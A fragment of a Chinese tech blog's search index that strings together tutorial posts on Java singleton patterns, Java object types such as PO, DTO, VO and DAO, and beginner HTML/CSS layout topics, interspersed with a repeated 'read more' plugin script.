5 }} 分析过程： 点击截图查看分析过程 设计模式单例模式知识点： 单例的特点 一是某个类只能有一个实例，即构造器私有化 二是必须自行创建这个实例，即含有一个该类的静态变量来保存唯一的实例 三是必须自行向整个系统提供这个实例，对外提供获取实例对象的方式一般是：直接通过静态变量暴露或者使用静态 Get 方法来获取 单例模式常见的几种形式 饿汉式（在类初始化时，直接创建对象，不存在线程安全的问题） 直接实例化饿汉式（简洁直观） 枚举式（最简洁） 静态代码块饿汉式（适合复杂的实例化） 懒汉式（延迟创建对象，可能存在线程安全的问题） 线程不安全（适用于单线程） 线程安全（适用于多线程） 静态内部类形式（适用于多线程） 饿汉式代码案例： 1234567891011/** * 饿汉式 - 直接实例化饿汉式（简洁直观） */public class HungrySingleton { public static final HungrySingleton INSTANCE = new HungrySingleton(); private HungrySingleton() { }} 123456/** * 饿汉式 - 枚举式（最简洁） */public enum HungrySingleton { INSTANCE} 12345678910111213141516/** * 饿汉式 - 静态代码块饿汉式（适合复杂的实例化） */public class HungrySingleton { public static final HungrySingleton INSTANCE; static { // do anything INSTANCE = new HungrySingleton(); } private HungrySingleton() { }} 懒汉式代码案例： 123456789101112131415161718/** * 懒汉式 - 线程不安全（适用于单线程） */public class LazySingleton01 { private static LazySingleton01 instance; private LazySingleton01() { } public static LazySingleton01 getInstance() { if (instance == null) { instance = new LazySingleton01(); } return instance; }} 12345678910111213141516171819202122232425/** * 懒汉式 - DCL（双端检锁），适用于多线程 * 1) DCL（双端检锁）机制不一定是线程安全的，原因是有指令重排序的存在，加入 volatile 可以禁止指令重排 * 2) 原因在多线程环境下，某一个线程执行到第一个检测，读取到的 instance 不为 null 时，instance 的引用对象可能没有完成初始化 * 3) 指令重排只会保证串行语义的执行一致性（单线程），但并不会关心多线程间的语义一致性。所以当一条线程访问 instance 不为 null 时，由于 instance 实例未必已初始化完成，也就造成了线程安全问题 */public class LazySingleton02 { private static volatile LazySingleton02 instance; private LazySingleton02() { } public static LazySingleton02 getInstance() { if (instance == null) { synchronized (LazySingleton02.class) { if (instance == null) { instance = new LazySingleton02(); } } } return instance; }} 12345678910111213141516171819/** * 懒汉式 - 静态内部类形式（适用于多线程） * 1）静态内部类不会自动随着外部类的加载和初始化而初始化，它是单独去加载和初始化的 * 2）因为是在静态内部类加载和初始化时，才创建单例对象，因此是线程安全的 */public class LazySingleton03 { private LazySingleton03() { } public static LazySingleton03 getInstance() { return Singleton.instance; } private static class Singleton { private static final LazySingleton03 instance = new LazySingleton03(); }} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"面试"},{title:"Java Object 的划分",url:"/posts/50900887.html",text:'PO 持久对象PO (Persistant Object) - 持久对象，就是对应数据库中某个表中的一条记录，多个记录可以用 PO 的集合表示。PO 中应该不包含任何对数据库的操作。Entity (实体) 就是典型的 PO 对象。 DO 领域对象DO (Domain Object) - 领域对象，就是从现实世界中抽象出来的有形或无形的业务实体。 TO 数据传输对象TO (Transfer Object) - 数据传输对象，在不同的应用程序之间传输的对象。 DTO 数据传输对象DTO (Data Transfer Object) - 数据传输对象。这个概念来源于 J2EE 的设计模式，原来的目的是为 EJB 的分布式应用提供粗粒度的数据实体，以减少分布式调用的次数，从而提高分布式调用的性能和降低网络负载。但在这里，泛指用于视图层与服务层之间的数据传输对象。 VO 值对象VO (Value Object) - 值对象。通常用于业务层之间的数据传递，和 PO 一样也是仅仅包含数据而已。但应是抽象出的业务对象，可以和数据库表对应，也可以不对应，这取决于实际的业务需求。用 new 关键字创建，由 GC 负责回收。VO 也可以用作 View Object (视图对象)，接收前端页面传递过来的数据并封装成对象；或者将业务处理完的结果，封装成前端页面要用的数据。 BO 业务对象BO (Business Object) - 业务对象。从业务模型的角度看，见 UML 元件领域模型中的领域对象。BO 是封装业务逻辑的 Java 对象，通过调用 DAO 方法，结合 PO 与 VO 进行业务操作。BO 业务对象的主要作用是把业务逻辑封装为一个对象，这个对象可以包括一个或多个其它的对象。比如一份简历，有教育经历、工作经历、社会关系等等。一般可以把教育经历对应一个 PO，工作经历对应一个 PO，社会关系对应一个 PO。建立一个对应简历的 BO 对象来处理简历，每个 BO 都包含这些 PO。这样处理业务逻辑时，就可以针对 BO 去处理。 POJO 简单 Java 对象POJO (Plain Ordinary Java Object) - 简单的 Java 对象。POJO 是传统意义上的 Java 对象。在一些 ORM 框架中，属于能够做到维护数据库表记录的 Persisent Object，完全是一个符合 Java Bean 规范的纯 Java 对象，没有增加别的属性和方法。POJO 可以理解为最基本的 Java Bean，只有属性字段及 setter 和 getter 方法。POJO 是 DO/VO/DTO/BO 的统称。 DAO 数据访问对象DAO (Data Access Object) - 数据访问对象。在 Sun 公司的一个标准 J2EE 设计模式中，有个接口就叫 DAO，它负责持久层的操作，同时可以为业务层提供接口。DAO 对象用于访问数据库，包含了各种数据库的操作方法，通常和 PO 一起使用。通过 DAO 的方法，结合 PO 对数据库进行相关的操作，夹在业务逻辑与数据库资源中间。可以配合 VO，提供数据库的 CRUD 操作。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java"},{title:"前端入门基础之 HTML 与 CSS 之四",url:"/posts/9ff6bfd2.html",text:'CSS 基础横向布局行内块横向布局的问题 代码换行会造成元素之间有默认间距 行内块是沿基线对齐（底部对齐），具体表现为当给元素设置垂直方向的内外边距时，会影响周围的元素 123456789101112131415161718192021222324252627282930313233343536373839&lt;!DOCTYPE html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;行内块横向布局的问题&lt;/title&gt; &lt;style type="text/css"&gt; * { margin: 0; padding: 0; } body { margin: 300px; } .one { width: 50px; height: 50px; padding: 100px; /* margin: 100px; */ background: red; display: inline-block; } .two { width: 100px; height: 100px; background: green; display: inline-block; } .three { width: 150px; height: 150px; background: blue; display: inline-block; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="one"&gt;&lt;/div&gt; &lt;div class="two"&gt;&lt;/div&gt; &lt;div class="three"&gt;&lt;/div&gt;&lt;/body&gt; 上述代码，在浏览器运行的效果如下： 行内元素横向布局的问题 代码换行会造成元素之间有默认间距 行内元素是沿基线对齐（底部对齐），具体表现为当给元素设置垂直方向的内外边距时，由于受基线对齐的限制，垂直方向的内外边距起不到预期的效果 123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;行内元素横向布局的问题：&lt;/title&gt; &lt;style type="text/css"&gt; * { margin: 0; padding: 0; } body { margin: 300px; } .one { width: 100px; height: 100px; background: red; } .span1 { padding: 50px; /* margin: 50px; */ } span { background: green; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="one"&gt;&lt;/div&gt; &lt;span class="span1"&gt;我是文本&lt;/span&gt; &lt;span class="span2"&gt;我是文本&lt;/span&gt; &lt;span class="span3"&gt;我是文本&lt;/span&gt;&lt;/body&gt; 上述代码，在浏览器运行的效果如下： float 浮动属性CSS 的三种显示模式（块级、行内、行内块）属于标准流。浮动的属性是 float，是一个脱离标准流的状态，也叫 “浮动流”。当元素设置浮动属性后，会按照标签的书写顺序，依次排列在包含块（父元素）内，一般称之为 浮动横向布局。值得一提的是，float 属性可以解决行内块和行内元素横向布局的问题，浮动横向布局 没有代码换行造成的默认间距，设置自身内外（垂直）边距不会影响周围的元素。 1234567891011121314151617181920212223242526272829303132333435363738&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;浮动&lt;/title&gt; &lt;style type="text/css"&gt; * { margin: 0; padding: 0; } body { margin: 300px; } .one { width: 50px; height: 50px; background: red; float: left; } .two { width: 100px; height: 100px; float: left; background: green; } .three { width: 150px; height: 150px; background: blue; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="one"&gt;&lt;/div&gt; &lt;div class="two"&gt;&lt;/div&gt; &lt;div class="three"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 上述代码，在浏览器运行的效果如下： 浮动横向布局浮动横向布局之一1234567891011121314151617181920212223242526272829303132333435&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;浮动横向布局一&lt;/title&gt; &lt;style type="text/css"&gt; * { margin: 0; padding: 0; } .one { width: 50px; height: 50px; background: red; } .two { width: 100px; height: 100px; float: left; background: green; } .three { width: 150px; height: 150px; float: left; background: blue; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="one"&gt;&lt;/div&gt; &lt;div class="two"&gt;&lt;/div&gt; &lt;div class="three"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 上述代码，在浏览器运行的效果如下： 浮动横向布局之二123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;浮动横向布局&lt;/title&gt; &lt;style type="text/css"&gt; * { margin: 0; padding: 0; } .one { width: 50px; height: 50px; background: red; float: left; } .two { width: 100px; height: 100px; float: left; background: green; } .three { width: 150px; height: 150px; float: left; background: blue; } .box { width: 400px; height: 300px; background: gray; } .main { height: 200px; background: yellow; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box"&gt; &lt;div class="one"&gt;&lt;/div&gt; &lt;div class="two"&gt;&lt;/div&gt; &lt;div class="three"&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class="main"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 上述代码，在浏览器运行的效果如下： 浮动布局的高度塌陷问题当子元素是浮动，且父元素没有设置固定高度时，由于子元素是飘起来的状态，父元素会认为没有内容撑开自身的高度，此时会造成高度塌陷，即父元素的高度是零。解决方案如下： 第一种：给父元素设置 overflow: hidden 属性，此方案一般不适用于下拉菜单 第二种：额外标签法 第三种：父元素调用 clearFix 类名（推荐） 第一种解决方案1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;浮动布局的高度塌陷问题&lt;/title&gt; &lt;style type="text/css"&gt; * { margin: 0; padding: 0; } .one { width: 50px; height: 50px; background: red; float: left; } .two { width: 100px; height: 100px; float: left; background: green; } .three { width: 150px; height: 150px; float: left; background: blue; } .box { width: 400px; background: gray; margin: 0 auto; /* 第一种方案：给父元素设置overflow属性 */ overflow: hidden; } .main { height: 200px; background: yellow; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box"&gt; &lt;div class="one"&gt;&lt;/div&gt; &lt;div class="two"&gt;&lt;/div&gt; &lt;div class="three"&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class="main"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 第二种解决方案1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;浮动布局的高度塌陷问题&lt;/title&gt; &lt;style type="text/css"&gt; * { margin: 0; padding: 0; } .one { width: 50px; height: 50px; background: red; float: left; } .two { width: 100px; height: 100px; float: left; background: green; } .three { width: 150px; height: 150px; float: left; background: blue; } .box { width: 400px; background: gray; margin: 0 auto; } .main { height: 200px; background: yellow; } /* 第二种方案（额外标签法） */ .four { background: orange; /* 清除之前的浮动元素造成的影响，让浮动元素占用位置 */ clear: both; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box"&gt; &lt;div class="one"&gt;&lt;/div&gt; &lt;div class="two"&gt;&lt;/div&gt; &lt;div class="three"&gt;&lt;/div&gt; &lt;!-- 第二种方案（额外标签法） --&gt; &lt;div class="four"&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class="main"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 第三种解决方案12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;浮动布局的高度塌陷问题&lt;/title&gt; &lt;style type="text/css"&gt; * { margin: 0; padding: 0; } .one { width: 50px; height: 50px; background: red; float: left; } .two { width: 100px; height: 100px; float: left; background: green; } .three { width: 150px; height: 150px; float: left; background: blue; } .box { width: 400px; background: gray; margin: 0 auto; } .main { height: 200px; background: yellow; } /* 第三种方案（父元素调用clearFix类名） */ .clearFix::after { content: ""; display: block; clear: both; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- 第三种方案（父元素调用clearFix类名） --&gt; &lt;div class="box clearFix"&gt; &lt;div class="one"&gt;&lt;/div&gt; &lt;div class="two"&gt;&lt;/div&gt; &lt;div class="three"&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class="main"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 最终效果图 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"前端"},{title:"前端入门基础之 HTML 与 CSS 之三",url:"/posts/625c1dcd.html",text:'CSS 基础行高与行间距行间距在 HTML 中，展示的文字涉及到下述几条基准线，包括顶线 (绿色)、中线 (蓝色)、基线 (红色)、底线 (紫色)。行距是指一行底线到下一行顶线的垂直距离。 行高行高是指一行基线到下一行基线的垂直距离。希望设置文本在元素中垂直方向的位置时，当盒子没有设置固定的高度，那么高度会随着行高的变化而变化；此时高度就是行高的值，因为文本始终要保持垂直居中于盒子。当盒子设置了固定的高度时，高度不会随着行高的变化而变化。一句话简单概括，当希望一个元素中的文本垂直居中于这个元素，则可以设置行高等于盒子的高度。 1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;行高和文本垂直居中&lt;/title&gt; &lt;style type="text/css"&gt; div { background-color: pink; font-size: 40px; line-height: 80px; height: 80px; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div&gt;文本&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 上述代码，在浏览器运行的效果如下： 复合属性font 复合属性 font 复合属性的书写规则：倾斜 | 加粗 | 字号/行高 | 字体，其中 字号 和 字体 是必填项 font 复合属性的书写示例：font: italic 700 50px/100px "宋体"、font: 50px "宋体" 当单属性和复合属性同时存在时，必须先写复合属性再写单属性，否则单属性会被复合属性中的值覆盖掉 12345678910111213141516171819202122232425262728293031&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;font复合属性&lt;/title&gt; &lt;style type="text/css"&gt; div { color: red; height: 100px; background-color: pink; } .box1 { line-height: 100px; /* font 单属性 */ font-size: 50px; font-weight: 400; font-family: "宋体"; font-style: italic; } .box2 { /* font 复合属性 */ font: italic 700 50px/100px "宋体"; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box1"&gt;font 单属性&lt;/div&gt; &lt;p&gt;&lt;/p&gt; &lt;div class="box2"&gt;font 复合属性&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; border 复合属性 border 复合属性的书写规则：粗细 | 样式 | 颜色 border 复合属性的书写示例：border: 3px dotted red、border: dotted red 当单属性和复合属性同时存在时，必须先写复合属性再写单属性，否则单属性会被复合属性中的值覆盖掉 123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;border复合属性&lt;/title&gt; &lt;style type="text/css"&gt; div { color: black; width: 200px; height: 200px; line-height: 200px; text-align: center; background-color: pink; } .box1 { /* border 单属性 */ border-width: 5px; border-style: solid; border-color: red; } .box2 { /* border 复合属性 */ border: 3px dotted red; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box1"&gt;border 单属性&lt;/div&gt; &lt;p&gt;&lt;/p&gt; &lt;div class="box2"&gt;border 复合属性&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; background 复合属性 background 复合属性的书写规则：背景颜色 | 背景图片 | 背景图片的平铺方式 | 水平位置 | 垂直位置 background 复合属性的书写示例：background: pink url(https://www.techgrow.cn/img/head.jpg) no-repeat center center 当单属性和复合属性同时存在时，必须先写复合属性再写单属性，否则单属性会被复合属性中的值覆盖掉 123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;background复合属性&lt;/title&gt; &lt;style type="text/css"&gt; div { color: red; width: 400px; height: 400px; line-height: 200px; text-align: center; } .box1 { /* background 单属性 */ background-color: pink; background-repeat: no-repeat; background-position: right bottom; background-image: url(https://www.techgrow.cn/img/head.jpg); } .box2 { /* background 复合属性 */ background: pink url(https://www.techgrow.cn/img/head.jpg) no-repeat center center; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box1"&gt;background 单属性&lt;/div&gt; &lt;p&gt;&lt;/p&gt; &lt;div class="box2"&gt;background 复合属性&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 盒子模型盒子模型概念 padding 内边距值得一提的是，padding 存在减宽度的使用场景：当块元素没有设置固定宽度时，即宽度和父元素一样，此时给该元素设置水平方向的 padding 时，不会撑宽盒子，而是会从 content 自动减去 padding 值，最终宽度的尺寸是不变的。当块元素设置了固定宽度，此时设置水平方向的 padding，盒子的宽度尺寸则会变大。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;padding内边距&lt;/title&gt; &lt;style type="text/css"&gt; .box1 { width: 200px; height: 200px; background: pink; /* 单属性的写法 */ /* 左内边距 */ padding-left: 10px; /* 上内边距 */ padding-top: 10px; /* 右内边距 */ padding-right: 10px; /* 下内边距 */ padding-bottom: 10px; } .box2 { width: 200px; height: 200px; background: yellow; /* 复合属性的写法 */ /* 一个值，表示上右下左的内边距 */ padding: 10px; /* 两个值，表示上下、左右的内边距 */ padding: 10px 20px; /* 三个值，表示上、左右、下的内边距 */ padding: 10px 20px 30px; /* 四个值，表示上、右、下、左的内边距 */ padding: 10px 20px 30px 40px; } .phone { width: 50px; height: 100px; background: yellowgreen; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box1"&gt; &lt;div class="phone"&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class="box2"&gt; &lt;div class="phone"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 上述代码，在浏览器运行的效果如下： margin 外边距值得一提的是，外边距存在合并的使用场景：当垂直排列的两个块元素，分别给上面的盒子设置向下的外边距和给下面的盒子设置向上的外边距，此时会形成外边距合并。当两个外边距的值相同时，那么外边距就是该值，当两个值不同时则是较大的那个值。 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;margin外边距&lt;/title&gt; &lt;style type="text/css"&gt; .box1 { width: 200px; height: 200px; background: pink; /* 单属性的写法 */ /* 左外边距 */ margin-left: 30px; /* 上外边距 */ margin-top: 30px; /* 右外边距 */ margin-right: 30px; /* 下外边距 */ margin-bottom: 30px; } .box2 { width: 200px; height: 200px; background: greenyellow; /* 复合属性的写法 */ /* 一个值，表示上右下左的外边距 */ margin: 10px; /* 两个值，表示上下、左右的外边距 */ margin: 10px 20px; /* 三个值，表示上、左右、下的外边距 */ margin: 10px 20px 30px; /* 四个值，表示上、右、下、左的外边距 */ margin: 10px 20px 30px 40px; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box1"&gt;&lt;/div&gt; &lt;div class="box2"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 上述代码，在浏览器运行的效果如下： margin 外边距塌陷 外边距塌陷：嵌套的两个块元素，给子元素（第一个）设置向上的外边距，此时父元素会跟着掉下来，形成了外边距塌陷 解决方案: 第一种：给父元素设置上边框，border-top: 1px solid transparent; 第二种：给父元素设置 overflow 属性，overflow: hidden; 第三种：给父元素设置浮动 第四种：给子元素设置浮动 12345678910111213141516171819202122232425262728&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;margin(外边距)塌陷&lt;/title&gt; &lt;style type="text/css"&gt; .box1 { width: 200px; height: 200px; overflow: hidden; background: pink; } .box2 { width: 50px; height: 80px; margin-left: 20px; margin-top: 20px; background: greenyellow; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box1"&gt; &lt;div class="box2"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 上述代码，在浏览器运行的效果如下： overflow 属性123456789101112131415161718192021222324252627282930313233343536373839&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;overflow属性&lt;/title&gt; &lt;style type="text/css"&gt; .box { width: 200px; height: 200px; /* 溢出属性 */ /* 溢出隐藏 */ /* overflow: hidden; */ /* 溢出滚动 */ /* overflow: scroll; */ /* 溢出自动设置滚动条 */ overflow: auto; /* 换行属性 */ /* 强制换行 */ /* word-break: break-all; */ /* 强制不换行 */ /* white-space: nowrap; */ background: pink; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box"&gt; 5月份，规模以上工业增加值率先实现由负转正，同比增长0.7%，6月份增速加快至3.9%。随着企业复工复产加快推进，产业链供应链堵点卡点逐步打通，汽车、电子等重点行业带动作用有望进一步增强。6月份，制造业PMI重回临界点以上，其中生产经营活动预期指数升至55.2%，表明制造业企业信心不断增强。 &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 上述代码，在浏览器运行的效果如下： 块元素水平居中text-align 能让标签内的文本、行内元素、行内块元素水平居中，但不能让标签内的块元素水平居中。如果希望标签内的块元素水平居中，需要给块元素设置水平左右方向的外边距为自适应，即 margin: 0 auto;。 12345678910111213141516171819202122232425262728&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;块元素水平居中&lt;/title&gt; &lt;style type="text/css"&gt; .box1 { width: 200px; height: 200px; text-align: center; background: pink; } .box2 { width: 50px; height: 50px; /* 让块元素水平居中于父元素：设置水平左右方向的外边距为自适应 */ margin: 0 auto; background: greenyellow; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box1"&gt; 盒子 &lt;div class="box2"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 上述代码，在浏览器运行的效果如下： 清除标签默认样式HTML 标签一般都有默认的 CSS 属性，若希望去掉默认的 CSS 属性（CSS 初始化），那么可以采用以下两种方式来实现。 12345678910111213141516171819202122232425262728293031323334353637&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="“utf-8"&gt; &lt;title&gt;清除标签默认样式(CSS初始化)&lt;/title&gt; &lt;style type="text/css"&gt; /* 第一种方式：使用星号（通配符），表示所有Html标签，在工作中不建议使用此方式 */ * { margin: 0; padding: 0; } /* 第二种方式：初始化将用到的标签，这样可以提高执行效率，在工作中建议使用此方式*/ body,h1,h2,h3,h4,h5,h6,ul,ol,dl,dt,dd,p{ margin: 0; padding: 0; } .box { background: pink; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box"&gt;&lt;/div&gt; &lt;h1&gt;标题&lt;/h1&gt; &lt;ul&gt; &lt;li&gt;列表1&lt;/li&gt; &lt;li&gt;列表2&lt;/li&gt; &lt;li&gt;列表3&lt;/li&gt; &lt;/ul&gt; &lt;dl&gt; &lt;dt&gt;列表4&lt;/dt&gt; &lt;dt&gt;列表5&lt;/dt&gt; &lt;/dl&gt;&lt;/body&gt;&lt;/html&gt; 块元素的默认宽度 块元素的默认宽度：块元素在不设置固定宽度时，其默认的宽度和父元素（content 区域）一样 块元素的默认面积组成：margin + border + padding + content 1234567891011121314151617181920212223242526&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="“utf-8"&gt; &lt;title&gt;块元素的默认高度&lt;/title&gt; &lt;style type="text/css"&gt; .box1 { width: 200px; height: 300px; background: pink; } .box2 { height: 100px; background: red; padding-left: 30px; border-left: 20px solid blue; margin-left: 10px; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box1"&gt; &lt;div class="box2"&gt;文本内容&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 上述代码，在浏览器运行的效果如下： img 标签底部留白由于 img 标签是行内块元素，底部会和文本的基线对齐，所有会留有一部分空白。去除底部留白的方案如下： 第一种方案：将 img 标签转换成块元素：display:block 第二种方案：将 box 的字体大小设置成 0 12345678910111213141516171819202122232425262728&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="“utf-8"&gt; &lt;title&gt;解决img底部留有空白的问题&lt;/title&gt; &lt;style type="text/css"&gt; .box { border: 1px solid red; /* 第一种 */ /* font-size: 0; */ } .box img { /* 第二种（推荐） */ display: block; } img { width: 300px; height: 150px; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box"&gt; &lt;img src="https://dss2.bdstatic.com/lfoZeXSm1A5BphGlnYG/skin/29.jpg" /&gt;图片 &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; CSS 实战a 标签导航学习目标：熟悉行高属性的应用 有个 5 个 a 标签，默认状态：宽是 100，高是 30，背景色是 yellow，字体颜色是 green，文本水平且居中于 a 标签，去掉下划线 鼠标移入 a 标签时，背景色变成 yellowgreen，字体颜色变成 red，加上下划线 5 个 a 标签水平居中于 box，且 box 的背景色是 pink 1234567891011121314151617181920212223242526272829303132333435363738&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;a标签导航&lt;/title&gt; &lt;style type="text/css"&gt; .box { background-color: pink; height: 40px; line-height: 40px; text-align: center; } .box a { width: 100px; height: 30px; line-height: 30px; color: green; display: inline-block; text-decoration: none; background-color: yellow; } .box a:hover { color: red; text-decoration: underline; background-color: yellowgreen; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box"&gt; &lt;a href="##"&gt;导航&lt;/a&gt; &lt;a href="##"&gt;导航&lt;/a&gt; &lt;a href="##"&gt;导航&lt;/a&gt; &lt;a href="##"&gt;导航&lt;/a&gt; &lt;a href="##"&gt;导航&lt;/a&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 上述代码，在浏览器运行的效果如下： var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"前端"},{title:"前端入门基础之 HTML 与 CSS 之二",url:"/posts/917845c1.html",text:'CSS 基础常用文本属性123456789101112/* 字体颜色 */color: blue;/* 字体大小，Chrome默认字体大小是16px */font-size: 60px; /* 字体类型，Chrome默认字体类型是微软雅黑；字体可以设置多个，用逗号隔开，按照顺序依次识别，如果全部字体都不被识别，则使用系统默认字体 */font-family: "宋体";/* 水平水平居中 */text-align: center;/* 字体加粗，正常值是400或者normal，加粗是700 */font-weight: 700;/* 首行缩进，建议使用 em 